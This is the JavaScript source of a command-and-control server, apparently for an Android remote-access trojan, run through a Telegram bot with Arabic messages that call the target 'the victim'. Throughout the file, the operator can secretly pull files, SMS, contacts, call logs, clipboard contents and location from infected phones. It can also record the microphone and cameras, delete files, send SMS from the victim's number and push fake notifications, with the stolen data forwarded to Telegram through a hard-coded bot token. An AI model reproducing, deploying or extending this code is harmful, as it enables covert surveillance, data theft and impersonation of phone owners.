const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8993975442:AAFdE-XRsm8qoxto5TN1-sPZG6jPlN6R6eg'
const id = '286706619'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• جهاز جديد متصل\n\n` +
        `• موديل الجهاز : <b>${model}</b>\n` +
        `• البطارية : <b>${battery}</b>\n` +
        `• نظام الاندرويد : <b>${version}</b>\n` +
        `• سطوح الشاشة : <b>${brightness}</b>\n` +
        `• مزود : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• لا يوجد جهاز متصل\n\n` +
            `• موديل الجهاز : <b>${model}</b>\n` +
            `• البطارية : <b>${battery}</b>\n` +
            `• نظام الاندرويد : <b>${version}</b>\n` +
            `• سطوح الشاشة : <b>${brightness}</b>\n` +
            `• مزود : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل الكاميرا الامامية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل كاميرا السلفي للضحية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• • ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
            const notificationMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${notificationMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• °• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioUrl = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioUrl}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (message.text == '/start') {
        appBot.sendMessage(id,
            '°• مرحبا بك في بوت التحكم بالاندرويد \n\n' +
            '• يمكنك التحكم في جميع الاجهزة المتصلة بالبوت من خلال الاوامر الموجودة في الاسفل \n\n' +
            '• المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (message.text == 'الاجهزة المتصلة') {
        if (appClients.size == 0) {
            appBot.sendMessage(id,
                '°• لا يوجد اجهزة متصلة حاليا \n\n' +
                '• تأكد من تشغيل التطبيق في جهاز الضحية'
            )
        } else {
            let text = '°• قائمة الاجهزة المتصلة : \n\n'
            appClients.forEach(function (value, key, map) {
                text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                    `• البطارية : <b>${value.battery}</b>\n` +
                    `• نظام الاندرويد : <b>${value.version}</b>\n` +
                    `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
                    `• مزود : <b>${value.provider}</b>\n\n`
            })
            appBot.sendMessage(id, text, {parse_mode: "HTML"})
        }
    }
    if (message.text == 'تنفيذ الامر') {
        if (appClients.size == 0) {
            appBot.sendMessage(id,
                '°• لا يوجد اجهزة متصلة حاليا \n\n' +
                '• تأكد من تشغيل التطبيق في جهاز الضحية'
            )
        } else {
            const deviceList = []
            appClients.forEach(function (value, key, map) {
                deviceList.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }])
            })
            appBot.sendMessage(id, '°• اختر الجهاز الذي تريد التحكم به :', {
                reply_markup: {
                    inline_keyboard: deviceList
                }
            })
        }
    }
})
appBot.on('callback_query', (msg) => {
    const data = msg.data
    const uuid = data.split(':')[1]
    const commend = data.split(':')[0]

    if (commend == 'device') {
        appBot.editMessageText(`°• اختر الامر الذي تريد تنفيذة على جهاز : <b>${appClients.get(uuid).model}</b>`, {
            chat_id: id,
            message_id: msg.message.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'قائمة التطبيقات', callback_data: 'apps:' + uuid},
                        {text: 'معلومات الجهاز', callback_data: 'device_info:' + uuid}
                    ],
                    [
                        {text: 'سحب الملفات', callback_data: 'file:' + uuid},
                        {text: 'حذف ملف', callback_data: 'delete_file:' + uuid}
                    ],
                    [
                        {text: 'سحب الحافظة', callback_data: 'clipboard:' + uuid},
                        {text: 'سحب الميكروفون', callback_data: 'microphone:' + uuid}
                    ],
                    [
                        {text: 'سحب الرسائل', callback_data: 'sms_all:' + uuid},
                        {text: 'ارسال رسالة', callback_data: 'send_message:' + uuid}
                    ],
                    [
                        {text: 'سحب جهات الاتصال', callback_data: 'contacts:' + uuid},
                        {text: 'ارسال رسالة للكل', callback_data: 'send_message_to_all:' + uuid}
                    ],
                    [
                        {text: 'سحب سجل المكالمات', callback_data: 'calls:' + uuid},
                        {text: 'سحب الاشعارات', callback_data: 'notifications:' + uuid}
                    ],
                    [
                        {text: 'صورة كاميرا امامية', callback_data: 'camera_main:' + uuid},
                        {text: 'صورة كاميرا خلفية', callback_data: 'camera_selfie:' + uuid}
                    ],
                    [
                        {text: 'تسجيل كاميرا امامية', callback_data: 'rec_camera_main:' + uuid},
                        {text: 'تسجيل كاميرا خلفية', callback_data: 'rec_camera_selfie:' + uuid}
                    ],
                    [
                        {text: 'تحديد الموقع', callback_data: 'location:' + uuid},
                        {text: 'هز الجهاز', callback_data: 'vibrate:' + uuid}
                    ],
                    [
                        {text: 'تنبية (Toast)', callback_data: 'toast:' + uuid},
                        {text: 'اظهار اشعار', callback_data: 'show_notification:' + uuid}
                    ],
                    [
                        {text: 'تشغيل صوت', callback_data: 'play_audio:' + uuid},
                        {text: 'ايقاف الصوت', callback_data: 'stop_audio:' + uuid}
                    ]
                ]
            }
        })
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n' +
            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع\n\n' +
            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد \n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد \n\n' +
            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n' +
            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n' +
            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• °• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
